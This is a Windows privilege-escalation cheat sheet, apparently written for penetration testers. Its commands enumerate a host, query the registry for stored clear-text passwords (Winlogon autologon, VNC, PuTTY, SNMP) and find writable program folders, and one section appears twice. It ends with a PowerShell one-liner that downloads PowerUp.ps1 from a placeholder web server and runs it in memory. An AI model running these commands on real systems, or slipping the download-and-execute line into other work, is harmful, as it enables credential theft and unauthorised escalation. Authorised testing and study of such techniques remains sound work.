# Windows-Cheatsheet

## Privilege Escalation
Reference: https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
Run this script: https://github.com/M4ximuss/Powerless/blob/master/Powerless.bat

### Basics

```
systeminfo
wmic qfe
net users
hostname
whoami
net localgroups
echo %logonserver%
netsh firewall show state
netsh firewall show config
netstat -an
```

### Clear Text Passwords
```
○ Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

○ VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

○ SNMP Parameters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

○ Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

○ Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

○ Weak Folder Permissions
```
Full Permissions for 'Everyone' on Program Folders

icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "Everyone"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "Everyone"

icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users" 

Modify Permissions for Everyone on Program Folders

icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "Everyone"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "Everyone"

icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users" 
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users" 
```

### View Installed Software
```
tasklist /SVC
net start
reg query HKEY_LOCAL_MACHINE\SOFTWARE
DRIVERQUERY

dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime

Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```



### Weak Folder Permissions
```
Full Permissions for 'Everyone' on Program Folders

icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "Everyone"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "Everyone"

icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users" 

Modify Permissions for Everyone on Program Folders

icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "Everyone"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "Everyone"

icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users" 
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users" 
```

### Scheduled Tasks
```
schtasks /query /fo LIST /v
```

### SharpUp
```
https://github.com/GhostPack/SharpUp
```

### PowerUp.ps1

```
powershell.exe /c IEX(New-Object Net.WebClient).downloadString('webserver/PowerUp.ps1') ;Invoke-AllChecks
```



